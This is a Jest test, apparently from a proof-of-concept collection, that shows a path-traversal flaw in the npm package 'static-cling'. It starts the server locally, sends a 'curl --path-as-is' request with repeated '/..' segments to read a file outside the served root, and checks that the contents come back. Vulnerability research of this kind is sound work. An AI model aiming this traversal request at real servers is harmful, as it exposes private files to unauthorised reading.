//https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/static-cling/test.js
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in static-cling", (done) => {
    const cling = require('static-cling').cling;
    const fs = require("fs");
    const { exec } = require("child_process");
    let hostsFile = fs.readFileSync(pathToFlag).toString();

    let config = {//defaults
        root: '.',
        port: 8978,
        filename: 'index.html'
    }
    cling(config);//overriding defaults

    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8978${genstr()}"`;

    exec(attack_string, (error, stdout) => {
        expect(stdout).toBe(hostsFile);
        done();
    });
});
